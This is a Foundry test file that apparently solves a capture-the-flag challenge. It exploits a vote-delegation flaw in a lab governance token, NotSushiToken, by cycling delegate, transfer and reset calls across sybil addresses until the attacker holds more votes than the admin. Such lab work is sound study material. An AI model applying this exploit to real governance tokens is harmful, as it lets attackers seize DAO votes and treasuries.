// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {NotSushiToken} from "src/governance-shenanigans/NotSushiToken.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker'); // WLed address 1
    address o1 = makeAddr('o1'); // WLed address 2
    address o2 = makeAddr('o2'); // WLed address 3
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    NotSushiToken governanceToken;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // setting up governance token
        vm.prank(admin);
        governanceToken = new NotSushiToken();

        // --attacker sybil attack - got 3 controlled addresses WLed
        address[] memory addresses = new address[](4);
        addresses[0]=adminUser; addresses[1]=attacker;
        addresses[2]=o1; addresses[3]=o2;

        vm.prank(admin);
        governanceToken.addWledAddresses(addresses);

        vm.prank(admin);
        governanceToken.mint(adminUser,2_000e18);
        vm.prank(admin);
        governanceToken.mint(attacker,500e18);

        // adminUser delegates all votes to himself
        vm.prank(adminUser);
        governanceToken.delegate(adminUser);

    }

    /// solves the challenge
    function testChallengeExploit() public {
        /// for this exploit, you can use vm.prank(..) w/ {attacker,o1,o2}

        // implement solution here
        //In this challenge, we have a problem in the logic of _delegate() and _movedelegate()
        //If the srcRep = address(0) then we will increase the vote of the dstRep and not decrease the srcRep
        //So there is a possibility to delegate vote to a user the first time with amount = balanceOf()->500
        //begin : _delegates[delegator](=srcRep) = address(0) | dstRep = user
        //end : _delegates[delegator](=srcRep) = user | vote[user] = amount
        //Then I will reset _delegates[delegator](=srcRep) to address(0) by delegate() with amount equal to 0
        //We just need to transfer our token in order to have amount = 0
        //So if we call again delegate :
        //begin : _delegates[delegator](=srcRep) = address(user) | dstRep = address(0)
        //end : _delegates[delegator](=srcRep) = address(0) | vote[user] = vote[user] - amount but amount =0
        //And so we can do that with a loop and increasing artificially the vote of a user.

        vm.startPrank(attacker);
        governanceToken.transfer(o1,governanceToken.balanceOf(attacker));
        console.log("balance of attacker : ", governanceToken.balanceOf(attacker));
        console.log("vote for attacker : ", governanceToken.getCurrentVotes(attacker));
        vm.stopPrank();

        for(uint i; i<3;++i){
            vm.startPrank(o1);
            console.log("balance of o1 : ", governanceToken.balanceOf(o1));
            governanceToken.delegate(attacker); //delegate 500 of vote to attacker
            governanceToken.transfer(o2,governanceToken.balanceOf(o1));
            console.log("balance of o1 : ", governanceToken.balanceOf(o1));
            governanceToken.delegate(address(0)); //delegate 0 of vote to address(0) and so at the end srcRep = address(0)
            console.log("vote for attacker : ", governanceToken.getCurrentVotes(attacker));
            vm.stopPrank();

            vm.startPrank(o2);
            console.log("balance of o2 : ", governanceToken.balanceOf(o2));
            governanceToken.delegate(attacker); //delegate 500 of vote to attacker
            governanceToken.transfer(o1,governanceToken.balanceOf(o2));
            console.log("balance of o2 : ", governanceToken.balanceOf(o2));
            governanceToken.delegate(address(0)); //delegate 0 of vote to address(0) and so at the end srcRep = address(0)
            console.log("vote for attacker : ", governanceToken.getCurrentVotes(attacker));
            vm.stopPrank();
        }

        vm.startPrank(o1);
        governanceToken.transfer(attacker,governanceToken.balanceOf(o1));
        vm.stopPrank();
        
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker gets more delegated votes than adminUser
        assertGt(
            governanceToken.getCurrentVotes(attacker),
            governanceToken.getCurrentVotes(adminUser)
        );

    }

}